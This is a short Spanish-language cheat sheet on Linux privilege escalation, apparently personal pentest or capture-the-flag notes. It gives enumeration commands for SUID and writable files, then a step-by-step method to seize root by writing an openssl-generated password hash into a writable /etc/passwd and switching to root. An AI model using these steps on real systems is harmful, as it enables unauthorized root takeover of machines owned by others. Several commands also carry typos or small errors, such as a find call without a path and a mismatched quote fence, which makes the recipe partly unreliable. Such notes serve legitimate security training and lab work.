# EXPLOTACION Y ABUSO DE PRIVILEGIOS

verifiacion de grupos a los que pertenecemos

```
id
```

verificacion del kernel

```
lsb_release -a
uname -a
```

Enumerar permisos SUID (preferentemente desde la raiz /)

```
find \-perm -4000 2>/dev/null
```

Enumerar archivos que tienen capacidad de escritura

```
find \-writable 2>/dev/null

find \-writable 2>/dev/null | grep "etc"  (filtrar una ruta importante)
```

En el caso de encontrar el archivo etc/passwd

podemos crear un nueo usuario con una contraseña UNIX

creamos la contraseña

```
openssl passwd
```

colocamos la contraseña (hash) y nos la copiamos

podemos verificar que es una contraseña UNIX con:

´´´
hash-identifier (una vez corrido te pide el hash)

hashid HASH (ponemos el hash)
´´´

ya que podemos escribir en /etc/passwd modificamos el usuario root con el hash creado:

```
root:HASH:0:0:root:/root:/usr/bin/bash
```

ahora que nosotros sabemos la contraseña podemos hacer:

```
sudo su (con nuestra contraseña)

whoami
```
